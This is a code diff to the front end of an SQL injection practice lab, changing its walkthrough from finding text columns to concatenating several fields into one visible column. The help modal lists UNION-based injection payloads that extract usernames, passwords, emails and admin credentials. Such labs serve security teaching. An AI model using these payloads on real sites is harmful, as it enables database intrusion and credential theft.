@@ -1,7 +1,7 @@
 import React from 'react';
 import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
 import Home from './Home';
-import ArticleDetail from './ArticleDetail';
+import ProductDetail from './ProductDetail';
 import './App.css';
 
 function App() {
@@ -10,7 +10,7 @@ function App() {
       <div className="app-container">
         <nav className="navbar navbar-expand-lg navbar-dark bg-primary">
           <div className="container">
-            <a className="navbar-brand" href="/">SQL Injection Lab: Finding Text Columns</a>
+            <a className="navbar-brand" href="/">SQL Injection Lab: Multiple Values in Single Column</a>
             <button className="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
               <span className="navbar-toggler-icon"></span>
             </button>
@@ -31,37 +31,35 @@ function App() {
           <div className="modal-dialog modal-lg">
             <div className="modal-content">
               <div className="modal-header">
-                <h5 className="modal-title">SQL Injection Text Column Lab</h5>
+                <h5 className="modal-title">SQL Injection Multiple Values Lab</h5>
                 <button type="button" className="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
               </div>
               <div className="modal-body">
                 <h4>Your objective:</h4>
                 <ol>
-                  <li>Determine which columns can accept text data</li>
-                  <li>Extract data from users table using text-compatible columns</li>
-                  <li>Extract admin credentials in visible positions</li>
+                  <li>Identify that only product names are clearly visible (limited visibility)</li>
+                  <li>Extract multiple user data fields in a single visible column</li>
+                  <li>Use string concatenation to combine username, password, and email</li>
                 </ol>
                 
-                <h4>Step 1: Find column count</h4>
-                <p>Use ORDER BY to determine columns:</p>
+                <h4>Step 1: Discover limited visibility</h4>
+                <p>Notice only 2 columns, but only product name is prominently displayed:</p>
                 <ul>
-                  <li><code>?category=tech' ORDER BY 5--</code> (should work)</li>
-                  <li><code>?category=tech' ORDER BY 6--</code> (should fail)</li>
+                  <li><code>?search=laptop' ORDER BY 2--</code> (should work)</li>
+                  <li><code>?search=laptop' ORDER BY 3--</code> (should fail)</li>
                 </ul>
                 
-                <h4>Step 2: Test each column for text compatibility</h4>
+                <h4>Step 2: Try single value extraction (the problem)</h4>
                 <ul>
-                  <li><code>?category=tech' UNION SELECT 'TEST',NULL,NULL,NULL,NULL--</code></li>
-                  <li><code>?category=tech' UNION SELECT NULL,'TEST',NULL,NULL,NULL--</code></li>
-                  <li><code>?category=tech' UNION SELECT NULL,NULL,'TEST',NULL,NULL--</code></li>
-                  <li><code>?category=tech' UNION SELECT NULL,NULL,NULL,'TEST',NULL--</code></li>
-                  <li><code>?category=tech' UNION SELECT NULL,NULL,NULL,NULL,'TEST'--</code></li>
+                  <li><code>?search=laptop' UNION SELECT NULL,username FROM users--</code> (only shows usernames)</li>
+                  <li><code>?search=laptop' UNION SELECT NULL,password FROM users--</code> (only shows passwords)</li>
                 </ul>
                 
-                <h4>Step 3: Extract data using text columns</h4>
+                <h4>Step 3: Use concatenation (the solution)</h4>
                 <ul>
-                  <li><code>?category=tech' UNION SELECT NULL,username,email,NULL,NULL FROM users--</code></li>
-                  <li><code>?category=tech' UNION SELECT NULL,admin_username,admin_password,NULL,role FROM admin_users--</code></li>
+                  <li><code>?search=laptop' UNION SELECT NULL,username||':'||password FROM users--</code></li>
+                  <li><code>?search=laptop' UNION SELECT NULL,username||':'||password||':'||email FROM users--</code></li>
+                  <li><code>?search=laptop' UNION SELECT NULL,'Admin: '||admin_username||' | Pass: '||admin_password FROM admin_users--</code></li>
                 </ul>
                 
                 <div className="alert alert-warning">
@@ -78,7 +76,7 @@ function App() {
         <div className="container py-4">
           <Routes>
             <Route path="/" element={<Home />} />
-            <Route path="/article/:id" element={<ArticleDetail />} />
+            <Route path="/product/:id" element={<ProductDetail />} />
           </Routes>
         </div>
       </div>
